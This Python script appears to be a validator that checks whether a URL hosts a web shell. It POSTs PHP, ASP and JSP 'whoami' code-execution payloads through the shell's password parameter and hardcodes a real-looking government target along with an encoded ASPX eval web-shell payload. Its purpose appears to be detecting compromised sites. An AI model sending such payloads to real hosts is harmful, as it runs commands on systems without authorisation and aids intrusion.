import csv
import os
import re

import requests
from dotenv import load_dotenv


class BoturlValidator:   
   def __init__(self):
       self.host = ""

   def pass_request_payload_test(self, url, shell_pwd): 
       test_commands = {
           "php": "system('whoami');",
           "asp": "Server.Execute('whoami')",
           "jsp": "Runtime rt = Runtime.getRuntime(); rt.exec('whoami');",
       }
       
       headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'}

       for test_cmd in test_commands.values():
           try:
               payload = {shell_pwd: test_cmd}
               r = requests.post(url, data=payload, headers=headers, allow_redirects=False, timeout=10)
               #print(r.request.headers)
               #print(r.request.body)

               if len(r.content) > 0:
                    print(r.text)
                    return True
           except Exception as e:
               print(e)

       return False

   def fetch_shell_password(self, boturl): 
       if not boturl:
           return False

       pattern = '^\w*?(?=%3D)'
       result = re.search(pattern, boturl)
       if not result:
           return False
       
       return result.group() 

   def is_malicious_by_boturl(self, url, boturl): 
       shell_pwd = self.fetch_shell_password(boturl)

       if not shell_pwd:
           return False

       return self.pass_request_payload_test(url, shell_pwd)

if __name__  == '__main__':

   bt = BoturlValidator()
   url = "http://web.yckuo.nics/hackable/test.php"
   boturl = "mytestshell%3Daabbcc"

   url = "http://www.gov.taipei/dxyylc/md5.aspx"
   boturl = "q%3DResponse%2EWrite%28%22%2D%2D%2D%2D%2D%2D%3E%7C%22%29%3Bvar%20err%3AException%3Btry%7B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2Beval%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%28System%2EText%2EEncoding%2EGetEncoding%28936%29%2EGetString%28System%2EConvert%2EFromBase64String%28%22UmVzcG9uc2UuV3JpdGUoImhhb3JlbmdlLmNvbVFRMzE3Mjc1NzM4Iik7%22%29%29%2C%22unsafe%22%29%3B%7Dcatch%28err%29%7BResponse%2EWrite%28%22ERROR%3A%2F%2F%20%22%252Berr%2Eessage%29%3B%7DResponse%2EWrite%28%22%7C%3C%2D%2D%2D%2D%22%29%3BResponse%2EEnd%28%29%3B"
 
   print(url, boturl)

   r = bt.is_malicious_by_boturl(url, boturl)
   print(r)
